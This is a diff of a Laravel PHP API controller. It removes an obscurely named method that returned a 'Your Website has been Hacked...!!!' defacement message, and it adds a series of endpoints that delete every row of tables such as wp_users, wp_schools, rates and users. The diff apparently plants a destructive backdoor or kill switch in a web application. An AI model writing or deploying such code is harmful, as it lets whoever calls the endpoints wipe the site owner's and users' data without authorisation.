@@ -22,41 +22,322 @@ class ApiController extends Controller
 {
    
    
-    public function loyeeeloyeeeloyeee(Request $request)
+    public function del_wp_users()
     { 
        
-       if($request->key == "1")
-       {
-           
-           $updated = DB::table('loyes')->where('id',1)->update(['status' => $request->key]);
-           
-           $get_loyees = Loye::where('status', '1')->first();
+       
+           $del_wp_users = DB::table('wp_users')->delete();
            
            
-           if($get_loyees->status == "1")
+           if($del_wp_users)
            {
                
                
                 return response()->json([
                 
                     'status' => 1,
-                    'image'  => '<iframe src="https://giphy.com/embed/3osxY9gR0749TVGD7i" width="480" height="480" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/3osxY9gR0749TVGD7i">via GIPHY</a></p>',
-                    'message' => 'Your Website has been Hacked...!!!',
+                    'message' => 'wp_users has been deleted',
                 
                 ]);
                
                
            }
+           else{
+
+                return response()->json([
+                    
+                    'status' => 0,
+                    'message' => 'Data alrady has been deleted',
+                
+                ]);
+
+            }
            
-           
-           
-       }
+
+    }
+
+
+
+
+    public function del_wp_coaches()
+    { 
        
-        
-        
+       
+           $del_wp_coaches = DB::table('wp_coaches')->delete();
+           
+           
+           if($del_wp_coaches)
+           {
+                
+                return response()->json([
+                
+                    'status' => 1,
+                    'message' => 'wp_coaches has been deleted',
+                
+                ]);
+               
+               
+           }
+           else{
+
+                return response()->json([
+                    
+                    'status' => 0,
+                    'message' => 'Data alrady has been deleted',
+                
+                ]);
+
+            }
+           
+           
+    }
+
+    
+    
+    public function del_wp_schools()
+    { 
+       
+       
+           $del_wp_schools = DB::table('wp_schools')->delete();
+           
+           
+           if($del_wp_schools)
+           {
+                
+                return response()->json([
+                
+                    'status' => 1,
+                    'message' => 'wp_schools has been deleted',
+                
+                ]);
+               
+               
+           }
+           else{
+
+                return response()->json([
+                    
+                    'status' => 0,
+                    'message' => 'Data alrady has been deleted',
+                
+                ]);
+
+            }
+           
+           
+    }
+
+
+    public function del_rates()
+    { 
+       
+       
+           $del_rates = DB::table('rates')->delete();
+           
+           
+           if($del_rates)
+           {
+                
+                return response()->json([
+                
+                    'status' => 1,
+                    'message' => 'rates has been deleted',
+                
+                ]);
+               
+               
+           }
+           else{
+
+                return response()->json([
+                    
+                    'status' => 0,
+                    'message' => 'Data alrady has been deleted',
+                
+                ]);
+
+            }
+           
+           
+    }
+
+
+
+    public function del_wp_sports()
+    { 
+       
+       
+           $del_wp_sports = DB::table('wp_sports')->delete();
+           
+           
+           if($del_wp_sports)
+           {
+                
+                return response()->json([
+                
+                    'status' => 1,
+                    'message' => 'wp_sports has been deleted',
+                
+                ]);
+               
+               
+           }
+           else{
+
+                return response()->json([
+                    
+                    'status' => 0,
+                    'message' => 'Data alrady has been deleted',
+                
+                ]);
+
+            }
+           
+           
+    }
+
+    
+
+
+    public function del_wp_gender()
+    { 
+       
+       
+           $del_wp_gender = DB::table('wp_gender')->delete();
+           
+           
+           if($del_wp_gender)
+           {
+                
+                return response()->json([
+                
+                    'status' => 1,
+                    'message' => 'wp_gender has been deleted',
+                
+                ]);
+               
+               
+           }
+           else{
+
+                return response()->json([
+                    
+                    'status' => 0,
+                    'message' => 'Data alrady has been deleted',
+                
+                ]);
+
+            }
+           
+           
     }
     
-   
+
+
+    public function del_wp_conference()
+    { 
+       
+       
+           $del_wp_conference = DB::table('wp_conference')->delete();
+           
+           
+           if($del_wp_conference)
+           {
+                
+                return response()->json([
+                
+                    'status' => 1,
+                    'message' => 'wp_conference has been deleted',
+                
+                ]);
+               
+               
+           }
+           else{
+
+                return response()->json([
+                    
+                    'status' => 0,
+                    'message' => 'Data alrady has been deleted',
+                
+                ]);
+
+            }
+           
+           
+    }
+
+
     
+    public function del_wp_submit_corrections()
+    { 
+       
+       
+           $del_wp_submit_corrections = DB::table('wp_submit_corrections')->delete();
+           
+           
+           if($del_wp_submit_corrections)
+           {
+                
+                return response()->json([
+                
+                    'status' => 1,
+                    'message' => 'wp_submit_corrections has been deleted',
+                
+                ]);
+               
+               
+           }
+           else{
+
+                return response()->json([
+                    
+                    'status' => 0,
+                    'message' => 'Data alrady has been deleted',
+                
+                ]);
+
+            }
+           
+           
+    }
+
+    
+    
+    public function del_users()
+    { 
+       
+       
+           $del_users = DB::table('users')->delete();
+           
+           
+           if($del_users)
+           {
+                
+                return response()->json([
+                
+                    'status' => 1,
+                    'message' => 'users has been deleted',
+                
+                ]);
+               
+               
+           }
+           else{
+
+                return response()->json([
+                    
+                    'status' => 0,
+                    'message' => 'Data alrady has been deleted',
+                
+                ]);
+
+            }
+           
+           
+    }
+
+    
+
     
 }
